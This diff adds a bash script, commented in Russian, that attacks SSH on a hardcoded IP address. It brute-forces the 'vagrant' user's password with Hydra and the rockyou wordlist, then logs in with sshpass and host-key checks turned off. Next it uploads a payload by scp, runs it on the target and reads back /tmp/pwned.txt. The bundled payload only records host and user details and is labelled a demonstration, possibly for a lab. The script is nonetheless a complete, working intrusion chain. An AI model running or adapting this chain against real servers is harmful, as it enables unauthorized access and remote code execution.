@@ -1,0 +1,90 @@
+#!/bin/bash
+
+# Конфиги
+TARGET_IP="33.57.84.200"
+TARGET_PORT="22"
+TARGET_USER="vagrant" 
+WORDLIST="rockyou.txt"
+PAYLOAD_FILE="payload.sh" 
+LOG_FILE="attack_log.txt"
+
+echo "[*] Начинаем атаку на $TARGET_IP:$TARGET_PORT"
+echo "[*] $(date)" >> $LOG_FILE
+
+# Bruteforce SSH пароля с помощью Hydra
+echo "[+] 1. Bruteforce пароля с помощью Hydra..."
+hydra -l $TARGET_USER -P $WORDLIST -o hydra_results.txt \
+    -f ssh://$TARGET_IP:$TARGET_PORT 2>&1 | tee -a $LOG_FILE
+
+# Проверяем, найден ли пароль
+if [ ! -f hydra_results.txt ] || ! grep -q "password" hydra_results.txt; then
+    echo "[-] Пароль не найден"
+    exit 1
+fi
+
+# Извлекаем пароль из результатов Hydra
+PASSWORD=$(grep -oP "password: \K.*" hydra_results.txt | head -1)
+
+if [ -z "$PASSWORD" ]; then
+    echo "[-] Не удалось извлечь пароль"
+    exit 1
+fi
+
+echo "[+] Пароль найден: $PASSWORD" | tee -a $LOG_FILE
+
+# Проверяем подключение
+echo "[+] 2. Проверка подключения SSH..."
+sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
+    -o UserKnownHostsFile=/dev/null \
+    -o ConnectTimeout=5 \
+    $TARGET_USER@$TARGET_IP "echo 'SSH connection successful'" 2>&1 | tee -a $LOG_FILE
+
+if [ $? -ne 0 ]; then
+    echo "[-] Не удалось подключиться по SSH"
+    exit 1
+fi
+
+echo "[+] SSH подключение успешно!" | tee -a $LOG_FILE
+
+# Загружаем и выполняем payload
+echo "[+] 3. Загрузка вредоноса на целевой сервер..."
+
+# Создаём простой payload, если его нет
+if [ ! -f "$PAYLOAD_FILE" ]; then
+    cat > $PAYLOAD_FILE << 'EOF'
+#!/bin/bash
+# Простой вредоносный payload для демонстрации
+echo "Payload executed on $(hostname) at $(date)" > /tmp/pwned.txt
+echo "User: $(whoami)" >> /tmp/pwned.txt
+echo "Current directory: $(pwd)" >> /tmp/pwned.txt
+EOF
+    chmod +x $PAYLOAD_FILE
+fi
+
+# Загружаем payload через SCP
+sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no \
+    -o UserKnownHostsFile=/dev/null \
+    $PAYLOAD_FILE $TARGET_USER@$TARGET_IP:/tmp/payload.sh 2>&1 | tee -a $LOG_FILE
+
+if [ $? -ne 0 ]; then
+    echo "[-] Не удалось загрузить файл"
+    exit 1
+fi
+
+echo "[+] Payload загружен" | tee -a $LOG_FILE
+
+# Выполняем payload
+echo "[+] 4. Выполнение полезной нагрузки на целевом сервере..."
+sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
+    -o UserKnownHostsFile=/dev/null \
+    $TARGET_USER@$TARGET_IP "/tmp/payload.sh" 2>&1 | tee -a $LOG_FILE
+
+echo "[+] Payload выполнен" | tee -a $LOG_FILE
+
+# Проверяем результаты
+echo "[+] 5. Проверка результатов на целевом сервере..."
+sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
+    -o UserKnownHostsFile=/dev/null \
+    $TARGET_USER@$TARGET_IP "cat /tmp/pwned.txt" 2>&1 | tee -a $LOG_FILE
+
+echo "[+] Атака завершена" | tee -a $LOG_FILE
